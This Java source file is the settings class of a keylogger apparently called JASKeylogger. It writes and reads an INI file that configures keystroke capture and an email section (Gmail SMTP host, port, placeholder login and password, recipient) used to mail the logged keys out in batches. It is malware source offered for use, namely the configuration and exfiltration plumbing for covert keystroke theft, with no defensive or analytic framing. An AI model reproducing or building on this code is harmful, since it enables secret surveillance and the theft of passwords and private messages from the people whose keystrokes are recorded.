/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package com.github.juliansantosinfo.jaskeylogger;

import java.io.File;
import java.io.IOException;
import java.util.prefs.Preferences;
import org.ini4j.Ini;
import org.ini4j.IniPreferences;

/**
 *
 * @author Julian
 */
public class KeyloggerSettings {

    /**
     *
     * @return
     */
    public static boolean checkIniFile() {

        boolean isChecked = true;
        File fileIni = Keylogger.INI_FILE;

        if (!fileIni.exists()) {

            // initializes file sections.
            if (createIniFile()) {
                isChecked = true;
            }

        }
        return isChecked;
    }

    /**
     *
     * @return
     */
    public static boolean createIniFile() {

        boolean isCreate = false;
        File fileIni = Keylogger.INI_FILE;

        try {

            // Verifies that the file exists.
            if (!fileIni.exists()) {
                fileIni.createNewFile();
            }

            Ini ini = new Ini(fileIni);

            // Set KEYLOGGER Section.
            ini.put("KEYLOGGER", "countKeys", 1);
            ini.put("KEYLOGGER", "sizeSendMail", 10);
            ini.put("KEYLOGGER", "keyTranscription", false);
            ini.put("KEYLOGGER", "tabBreakLine", false);
            ini.put("KEYLOGGER", "enterBreakLine", true);

            // Set EMAIL section.
            ini.put("EMAIL", "hostName", "smtp.gmail.com");
            ini.put("EMAIL", "smtpPort", 465);
            ini.put("EMAIL", "userName", "email@gmail.com");
            ini.put("EMAIL", "password", "your_password");
            ini.put("EMAIL", "from", "");
            ini.put("EMAIL", "to", "");
            ini.put("EMAIL", "subject", "Subject to E-mail");
            ini.put("EMAIL", "sslOnConnect", true);
            ini.put("EMAIL", "tslOnConnect", false);

            // Store sections.
            ini.store();

            isCreate = true;

        } catch (IOException ex) {
        }

        return isCreate;
    }

    /**
     *
     * @return
     */
    public static boolean loadKeyloggerSettings(Keylogger keylogger) {

        boolean loadSuccessfully = false;
        File fileIni = Keylogger.INI_FILE;

        checkIniFile();

        if (!fileIni.exists()) {
            return loadSuccessfully;
        }

        try {

            // Variaveis.
            Preferences ini = new IniPreferences(new Ini(fileIni));

            // Load Settings for KEYLOGGER section.
            keylogger.setCountKeys(ini.node("KEYLOGGER").getInt("countKeys", 0));
            keylogger.setSizeSendMail(ini.node("KEYLOGGER").getInt("sizeSendMail", 0));
            keylogger.setKeyTranscription(ini.node("KEYLOGGER").getBoolean("keyTranscription", false));
            keylogger.setTabBreakLine(ini.node("KEYLOGGER").getBoolean("tabBreakLine", true));
            keylogger.setEnterBreakLine(ini.node("KEYLOGGER").getBoolean("enterBreakLine", false));

            loadSuccessfully = true;

        } catch (IOException ex) {
        }

        return loadSuccessfully;
    }

    /**
     *
     * @return
     */
    public static boolean loadEmailSettings(KeyloggerSendMail keyloggerSendMail) {

        boolean loadSuccessfully = false;
        File fileIni = Keylogger.INI_FILE;

        checkIniFile();

        if (!fileIni.exists()) {
            return loadSuccessfully;
        }

        try {

            // Variaveis.
            Preferences ini = new IniPreferences(new Ini(fileIni));

            // Load Settings for EMAIL section.
            keyloggerSendMail.setHostName(ini.node("EMAIL").get("hostName", ""));
            keyloggerSendMail.setSmtpPort(ini.node("EMAIL").getInt("smtpPort", 0));
            keyloggerSendMail.setUserName(ini.node("EMAIL").get("userName", ""));
            keyloggerSendMail.setPassword(ini.node("EMAIL").get("password", ""));
            keyloggerSendMail.setFrom(ini.node("EMAIL").get("from", ""));
            keyloggerSendMail.setTo(ini.node("EMAIL").get("to", ""));
            keyloggerSendMail.setSubject(ini.node("EMAIL").get("subject", "JASKeylogger"));
            keyloggerSendMail.setSslOnConnect(ini.node("EMAIL").getBoolean("sslOnConnect", true));
            keyloggerSendMail.setTslOnConnect(ini.node("EMAIL").getBoolean("tslOnConnect", false));

            loadSuccessfully = true;

        } catch (IOException ex) {
        }

        return loadSuccessfully;
    }

}
